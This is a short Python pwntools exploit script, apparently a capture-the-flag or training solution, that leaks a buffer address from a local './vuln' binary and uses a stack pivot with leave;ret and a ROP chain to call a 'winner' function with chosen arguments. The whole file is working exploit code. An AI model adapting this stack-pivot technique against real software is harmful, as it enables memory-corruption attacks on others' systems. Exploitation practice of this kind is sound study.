from pwn import *

elf = context.binary = ELF('./vuln')
p = process('./vuln')

p.recvuntil('to: ')
buffer = int(p.recvline(), 16)
print('Buffer: ' +  hex(buffer))

LEAVE_RET = 0x4011b4		# leave ; ret = mov rsp, rbp ; pop rbp
POP_RDI = 0x401273		# RDI, ret
POP_RSI_R15 = 0x401271		# RSI, R15, ret

payload = flat(
    0x0,               # rbp in leave ; ret gadgets
    POP_RDI,
    0xdeadbeef,
    POP_RSI_R15,
    0xdeadc0de,
    0x0,
    elf.sym['winner']
)

payload = payload.ljust(96, b'A')     # pad to 96 (just get to RBP)

payload += flat(
    buffer,		# in leave ; ret of func vuln()
    LEAVE_RET
)

p.sendline(payload)

p.interactive()
